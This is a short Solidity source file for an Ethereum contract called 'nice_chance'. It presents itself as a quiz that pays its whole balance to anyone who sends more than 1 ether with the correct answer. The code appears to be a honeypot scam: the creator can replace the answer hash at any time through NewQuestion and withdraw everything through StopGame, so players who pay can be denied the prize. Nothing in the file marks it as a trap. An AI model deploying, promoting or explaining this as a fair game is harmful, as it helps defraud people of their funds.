/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract nice_chance at 0x2E0794073ec7b08E40D80A41599BB31Df042e4E5
*/
pragma solidity ^0.4.20;

contract nice_chance
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    string public question;
 
    address questionSender;
  
    bytes32 responseHash;
 
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            
            question = _question;
            
            questionSender = msg.sender;
        }
    }
    
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       
       msg.sender.transfer(this.balance);
    }
    
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        
        question = _question;
        
        responseHash = _responseHash;
    }
    
    function() public payable{}
}